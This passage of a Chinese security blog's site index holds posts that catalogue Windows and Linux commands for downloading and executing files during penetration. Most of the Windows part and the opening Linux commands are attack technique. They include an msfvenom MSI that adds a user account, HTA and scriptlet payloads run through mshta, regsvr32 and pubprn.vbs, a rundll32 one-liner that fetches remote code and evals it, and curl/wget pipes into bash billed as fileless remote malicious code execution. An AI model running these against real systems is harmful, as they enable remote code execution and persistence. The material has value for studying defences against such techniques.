msiexec&emsp;msiexec是windows自带的cmd工具，支持远程下载功能，攻击者可以将msi文件上传到服务器并执行，下面通过一个实例做演示说明，首先我们通过msfvenom来构造一个恶意的msi程序(这里以弹计算器为例，在实战中可以根据需要进行修改)，并启动一个简易HTTP服务： 12msfvenom -p windows/exec CMD=&#x27;net user test abc123! /add&#x27; -f msi &gt; evil.msi#生成 msi 包msiexec /q /i http://192.168.28.128/evil.msi#远程执行 2.7 mshta&emsp;mshta.exe是微软Windows操作系统相关程序，英文全称Microsoft HTML Application，可翻译为微软超文本标记语言应用，用于执行.HTA文件，我们可以在本地构建hta文件，之后通过目标主机的mshta来远程下载并执行，例如在本地创建以下hta文件： 12345678910111213&lt;HTML&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;&lt;HEAD&gt;&lt;script language=&quot;VBScript&quot;&gt;Set objShell = CreateObject(&quot;Wscript.Shell&quot;)objShell.Run &quot;cmd.exe /c calc.exe&quot; // 待执行的命令self.close&lt;/script&gt;&lt;body&gt;Demo&lt;/body&gt;&lt;/HEAD&gt;&lt;/HTML&gt; 之后在远程目标主机上执行以下命令实现下载执行操作，且无文件落地： 1mshta http://192.168.174.1:1234/evil.hta 2.8 rundll32&emsp;Rundll32.exe功能是以命令行的方式调用动态链接程序库，系统中还有一个Rundll64.exe文件，它的意思是”执行64位的DLL文件”， 其命令行下的使用方法为：Rundll32.exe DLLname,Functionname Arguments，其中DLLname为需要执行的DLL文件名，Functionname为前边需要执行的DLL文件的具体引出函数，Arguments为引出函数的具体参数。 1rundll32.exe javascript:&quot;\\..\\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;GET&quot;,&quot;http://127.0.0.1:8081/connect&quot;,false);try&#123;h.Send();b=h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im rundll32.exe&quot;,0,true);&#125;% 2.9 regsvr32&emsp;Regsvr32命令用于注册COM组件，是Windows系统提供的用来向系统注册控件或者卸载控件的命令，以命令行方式运行，我们可以通过该命令来实现远程文件下载。 1regsvr32 /u /s /i:http://192.168.3.1/test.data scrobj.dll test.data内容： 123456789101112131415&lt;?XML version=&quot;1.0&quot;?&gt;&lt;scriptlet&gt;&lt;registration progid=&quot;ShortJSRAT&quot; classid=&quot;&#123;10001111-0000-0000-0000-0000FEEDACDC&#125;&quot; &gt; &lt;!-- Learn from Casey Smith @subTee --&gt; &lt;script language=&quot;JScript&quot;&gt; &lt;![CDATA[ ps = &quot;cmd.exe /c calc.exe&quot;; new ActiveXObject(&quot;WScript.Shell&quot;).Run(ps,0,true); ]]&gt;&lt;/script&gt;&lt;/registration&gt;&lt;/scriptlet&gt; 2.10 pubprn.vbs&emsp;在Windows 7以上版本存在一个名为PubPrn.vbs的微软已签名WSH脚本，其位于C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US，仔细观察该脚本可以发现其显然是由用户提供输入（通过命令行参数），之后再将参数传递给GetObject() 1&quot;C:\\Windows\\System32\\Printing_Admin_Scripts\\zh-CN\\pubprn.vbs&quot; 127.0.0.1 script:https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct test.sct 12345678910111213141516&lt;?XML version=&quot;1.0&quot;?&gt;&lt;scriptlet&gt;&lt;registration description=&quot;Bandit&quot; progid=&quot;Bandit&quot; version=&quot;1.00&quot; classid=&quot;&#123;AAAA1111-0000-0000-0000-0000FEEDACDC&#125;&quot; remotable=&quot;true&quot; &gt;&lt;/registration&gt;&lt;script language=&quot;JScript&quot;&gt;&lt;![CDATA[ var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc.exe&quot;);]]&gt;&lt;/script&gt;&lt;/scriptlet&gt; 参考链接 Windows 文件下载执行的 15 种姿势 渗透中15种文件下载的方法 警惕：通过命令下载执行恶意代码的几种姿势 Windows执行命令与下载文件总结 windows/Linux文件下载方式汇总","categories":[{"name":"下载命令","slug":"下载命令","permalink":"http://wayoka.github.io/categories/%E4%B8%8B%E8%BD%BD%E5%91%BD%E4%BB%A4/"},{"name":"Windows平台","slug":"下载命令/Windows平台","permalink":"http://wayoka.github.io/categories/%E4%B8%8B%E8%BD%BD%E5%91%BD%E4%BB%A4/Windows%E5%B9%B3%E5%8F%B0/"}],"tags":[{"name":"下载命令","slug":"下载命令","permalink":"http://wayoka.github.io/tags/%E4%B8%8B%E8%BD%BD%E5%91%BD%E4%BB%A4/"},{"name":"Windows平台","slug":"Windows平台","permalink":"http://wayoka.github.io/tags/Windows%E5%B9%B3%E5%8F%B0/"}]},{"title":"常用下载命令整理-Linux篇","slug":"常用下载命令之Linux","date":"2020-01-02T04:02:26.000Z","updated":"2021-10-29T09:15:09.204Z","comments":false,"path":"2020/01/02/常用下载命令之Linux/","link":"","permalink":"http://wayoka.github.io/2020/01/02/%E5%B8%B8%E7%94%A8%E4%B8%8B%E8%BD%BD%E5%91%BD%E4%BB%A4%E4%B9%8BLinux/","excerpt":"1.综述 本文收集了 15 种在Windows系统下常见的文件下载方式，Windows命令行自带工具下载指令列表如下： 序号下载指令描述1curlCurl是另一种高效的下载工具，它可以用来上传或下载文件，只要使用一个简单的命令。它支持暂停和恢复下载程序包，并支持数量最多的Web协议，可预测下载完成还剩余多少时间，可通过进度条来显示下载进度。它是所有Linux发行版的内置工具。2wget这是最有名的工具，可用于通过CLI下载。这款工具功能很丰富，可以充当某种功能完备的GUI下载管理器，它拥有一款理想的下载管理器所需要的所有功能，比如它可以恢复下载，可以下载多个文件，出现某个连接问题后，可以重新","text":"1.综述&emsp;本文收集了 15 种在Windows系统下常见的文件下载方式，Windows命令行自带工具下载指令列表如下： 序号 下载指令 描述 1 curl Curl是另一种高效的下载工具，它可以用来上传或下载文件，只要使用一个简单的命令。它支持暂停和恢复下载程序包，并支持数量最多的Web协议，可预测下载完成还剩余多少时间，可通过进度条来显示下载进度。它是所有Linux发行版的内置工具。 2 wget 这是最有名的工具，可用于通过CLI下载。这款工具功能很丰富，可以充当某种功能完备的GUI下载管理器，它拥有一款理想的下载管理器所需要的所有功能，比如它可以恢复下载，可以下载多个文件，出现某个连接问题后，可以重新尝试下载，你甚至可以管理最大的下载带宽。 3 rcp rcp命令用于复制远程文件或目录。 4 scp scp 是 rcp 的加强版，scp 是加密的，rcp 是不加密的。 5 rsync 使用rsync可以进行远程同步，拉取文件到本地服务器。 6 sftp 使用sftp下载远程服务器上的文件。 7 axel 这是wget的出色替代者，是一款轻量级下载实用工具。它实际上是个加速器，因为它打开了多路http连接，可下载独立文件片段，因而文件下载起来更快速。 8 Youtube-dl 这是一款专用工具，可以通过命令行从YouTube下载视频，这是个易于安装的程序包，可用来下载一大批文件。 9 Aria2 这是一种开源命令行下载加速器，支持多个端口，你可以使用最大带宽来下载文件，是一款易于安装、易于使用的工具。 10 Movgrab 这是用于下载视频的另一款高效工具，使用movgrab的优点在于，它不仅可以从YouTube下载视频，还可以从几乎所有的知名网站下载视频，比如metacafe、dailiymotion、 ehow和vobx等。这是一款很快速的工具，可以定义影片格式，还可以恢复下载。 11 rtorrent 这种知名的命令行torrent客户软件随附在所有Linux发行版中，它需要screen实用工具才能正常运行。 12 ctorrent C-torrent是最简单的命令行torrent下载工具，可以迅速安装，也是micro-torrent或utorrent的优秀替代者。 13 Transmission-cli Transmission的这个命令行版本是一款非常强大的工具，可用于下载torrent。易于安装，它需要screen这个依赖项。 2. 常用下载指令2.1 curl12curl -fsSL http://192.168.99.19:8080/test.sh | bash bash &lt; &lt;( curl http://192.168.99.19:8080/test.sh) 2.2 wget12wget -q -O- http://192.168.99.19:8080/test.sh | bash wget http://192.168.99.19:8080/shell.txt -O /tmp/x.php &amp;&amp; php /tmp/x.php curl+wget合并，实现无文件远程恶意代码执行。 12bash -c &#x27;(curl -fsSL http://192.168.99.19:8080/test.sh|| wget -q -O- http://192.168.99.19:8080/test.sh)|bash -sh &gt;/dev/null 2&gt;&amp;1&amp;&#x27; 2.3 rcprcp命令用于复制远程文件或目录。 1rcp root@x.x.x.x:./testfile testfile 2.4 scpscp 是 rcp 的加强版，scp 是加密的，rcp 是不加密的。 1scp username@servername:/path/filename /tmp/local_destination 2.5 rsync使用rsync可以进行远程同步，拉取文件到本地服务器。 1rsync -av x.x.x.x:/tmp/passwd.txt /tmp/passwd.txt 2.6 sftp使用sftp下载远程服务器上的文件。 1sftp admin@192.168.99.242 &lt; 2.7 axel这是wget的出色替代者，是一款轻量级下载实用工具。它实际上是个加速器，因为它打开了多路http连接，可下载独立文件片段，因而文件下载起来更快速。 12# axel http://www.sample-videos.com/video/mp4/720/big_buck_bunny_720p_1mb.mp4 Initializing download: http://www.sample-videos.com/video/mp4/720/big_buck_bunny_720p_1mb.mp4 2.8 Youtube-dl这是一款专用工具，可以通过命令行从YouTube下载视频，这是个易于安装的程序包，可用来下载一大批文件。 1youtube-dl https://www.youtube.com/watch?v=UZW2hs-2OAI 想下载视频列表，将所有URL拷贝到一个文本文件中，然后运行下面这个命令： 1youtube-dl -a &lt;name_of_your_text_file.txt&gt; 2.9 Aria2这是一种开源命令行下载加速器，支持多个端口，你可以使用最大带宽来下载文件，是一款易于安装、易于使用的工具。 1aria2c http://www.sample-videos.com/video/mp4/720/big_buck_bunny_720p_1mb.mp4 2.10 Movgrab这是用于下载视频的另一款高效工具，使用movgrab的优点在于，它不仅可以从YouTube下载视频，还可以从几乎所有的知名网站下载视频，比如metacafe、dailiymotion、 ehow和vobx等。这是一款很快速的工具，可以定义影片格式，还可以恢复下载。 123movgrab Youtube_url # 指定输出文件： movgrab -o example.mp4 video_url 2.11 rtorrent这种知名的命令行torrent客户软件随附在所有Linux发行版中，它需要screen实用工具才能正常运行。 1rtorrent example.torrent 2.12 ctorrent1ctorrent ubuntu-16.04-server-amd64.iso.torrent 2.13 Transmission-cli1screen -a /usr/bin/transmission-cli -p 25000 ubuntu-16.04-server-amd64.iso.torrent 参考链接 Linux 下十大命令行下载工具 渗透中15种文件下载的方法 警惕：通过命令下载执行恶意代码的几种姿势 windows/Linux文件下载方式汇总","categories":[{"name":"下载命令","slug":"下载命令","permalink":"http://wayoka.github.io/categories/%E4%B8%8B%E8%BD%BD%E5%91%BD%E4%BB%A4/"},{"name":"Linux","slug":"下载命令/Linux","permalink":"http://wayoka.github.io/categories/%E4%B8%8B%E8%BD%BD%E5%91%BD%E4%BB%A4/Linux/"}],"tags":[{"name":"下载命令","slug":"下载命令","permalink":"http://wayoka.github.io/tags/%E4%B8%8B%E8%BD%BD%E5%91%BD%E4%BB%A4/"},{"name":"Linux","slug":"Linux","permalink":"http://wayoka.github.io/tags/Linux/"}]}],"categories":[{"name":"nginx","slug":"nginx","permalink":"http://wayoka.github.io/categories/nginx/"},{"name":"网络安全","slug":"网络安全","permalink":"http://wayoka.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"岗位介绍","slug":"网络安全/岗位介绍","permalink":"http://wayoka.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%B2%97%E4%BD%8D%E4%BB%8B%E7%BB%8D/"},{"name":"APT组织","slug":"APT组织","permalink":"http://wayoka.github.io/categories/APT%E7%BB%84%E7%BB%87/"},{"name":"海莲花组织","slug":"APT组织/海莲花组织","permalink":"http://wayoka.github.io/categories/APT%E7%BB%84%E7%BB%87/%E6%B5%B7%E8%8E%B2%E8%8A%B1%E7%BB%84%E7%BB%87/"},{"name":"逆向","slug":"APT组织/海莲花组织/逆向","permalink":"http://wayoka.github.io/categories/APT%E7%BB%84%E7%BB%87/%E6%B5%B7%E8%8E%B2%E8%8A%B1%E7%BB%84%E7%BB%87/%E9%80%86%E5%90%91/"},{"name":"逆向","slug":"逆向","permalink":"http://wayoka.github.io/categories/%E9%80%86%E5%90%91/"},{"name":"宏病毒","slug":"逆向/宏病毒","permalink":"http://wayoka.github.io/categories/%E9%80%86%E5%90%91/%E5%AE%8F%E7%97%85%E6%AF%92/"},{"name":"知识积累","slug":"逆向/宏病毒/知识积累","permalink":"http://wayoka.github.io/categories/%E9%80%86%E5%90%91/%E5%AE%8F%E7%97%85%E6%AF%92/%E7%9F%A5%E8%AF%86%E7%A7%AF%E7%B4%AF/"},{"name":"网络安全","slug":"逆向/宏病毒/知识积累/网络安全","permalink":"http://wayoka.github.io/categories/%E9%80%86%E5%90%91/%E5%AE%8F%E7%97%85%E6%AF%92/%E7%9F%A5%E8%AF%86%E7%A7%AF%E7%B4%AF/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"攻击中国","slug":"APT组织/攻击中国","permalink":"http://wayoka.github.io/categories/APT%E7%BB%84%E7%BB%87/%E6%94%BB%E5%87%BB%E4%B8%AD%E5%9B%BD/"},{"name":"威胁情报","slug":"威胁情报","permalink":"http://wayoka.github.io/categories/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/"},{"name":"攻击模型","slug":"威胁情报/攻击模型","permalink":"http://wayoka.github.io/categories/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/%E6%94%BB%E5%87%BB%E6%A8%A1%E5%9E%8B/"},{"name":"反调试","slug":"逆向/反调试","permalink":"http://wayoka.github.io/categories/%E9%80%86%E5%90%91/%E5%8F%8D%E8%B0%83%E8%AF%95/"},{"name":"下载命令","slug":"下载命令","permalink":"http://wayoka.github.io/categories/%E4%B8%8B%E8%BD%BD%E5%91%BD%E4%BB%A4/"},{"name":"Windows平台","slug":"下载命令/Windows平台","permalink":"http://wayoka.github.io/categories/%E4%B8%8B%E8%BD%BD%E5%91%BD%E4%BB%A4/Windows%E5%B9%B3%E5%8F%B0/"},{"name":"Linux","slug":"下载命令/Linux","permalink":"http://wayoka.github.io/categories/%E4%B8%8B%E8%BD%BD%E5%91%BD%E4%BB%A4/Linux/"}],"tags":[{"name":"nginx","slug":"nginx","permalink":"http://wayoka.github.io/tags/nginx/"},{"name":"实用模块","slug":"实用模块","permalink":"http://wayoka.github.io/tags/%E5%AE%9E%E7%94%A8%E6%A8%A1%E5%9D%97/"},{"name":"岗位介绍","slug":"岗位介绍","permalink":"http://wayoka.github.io/tags/%E5%B2%97%E4%BD%8D%E4%BB%8B%E7%BB%8D/"},{"name":"网络安全","slug":"网络安全","permalink":"http://wayoka.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"逆向","slug":"逆向","permalink":"http://wayoka.github.io/tags/%E9%80%86%E5%90%91/"},{"name":"APT组织","slug":"APT组织","permalink":"http://wayoka.github.io/tags/APT%E7%BB%84%E7%BB%87/"},{"name":"海莲花组织","slug":"海莲花组织","permalink":"http://wayoka.github.io/tags/%E6%B5%B7%E8%8E%B2%E8%8A%B1%E7%BB%84%E7%BB%87/"},{"name":"Windows病毒分析","slug":"Windows病毒分析","permalink":"http://wayoka.github.io/tags/Windows%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"},{"name":"宏","slug":"宏","permalink":"http://wayoka.github.io/tags/%E5%AE%8F/"},{"name":"宏病毒","slug":"宏病毒","permalink":"http://wayoka.github.io/tags/%E5%AE%8F%E7%97%85%E6%AF%92/"},{"name":"word","slug":"word","permalink":"http://wayoka.github.io/tags/word/"},{"name":"知识积累","slug":"知识积累","permalink":"http://wayoka.github.io/tags/%E7%9F%A5%E8%AF%86%E7%A7%AF%E7%B4%AF/"},{"name":"攻击中国","slug":"攻击中国","permalink":"http://wayoka.github.io/tags/%E6%94%BB%E5%87%BB%E4%B8%AD%E5%9B%BD/"},{"name":"威胁情报","slug":"威胁情报","permalink":"http://wayoka.github.io/tags/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/"},{"name":"攻击检测模型","slug":"攻击检测模型","permalink":"http://wayoka.github.io/tags/%E6%94%BB%E5%87%BB%E6%A3%80%E6%B5%8B%E6%A8%A1%E5%9E%8B/"},{"name":"反调试","slug":"反调试","permalink":"http://wayoka.github.io/tags/%E5%8F%8D%E8%B0%83%E8%AF%95/"},{"name":"下载命令","slug":"下载命令","permalink":"http://wayoka.github.io/tags/%E4%B8%8B%E8%BD%BD%E5%91%BD%E4%BB%A4/"},{"name":"Windows平台","slug":"Windows平台","permalink":"http://wayoka.github.io/tags/Windows%E5%B9%B3%E5%8F%B0/"},{"name":"Linux","slug":"Linux","permalink":"http://wayoka.github.io/tags/Linux/"}]}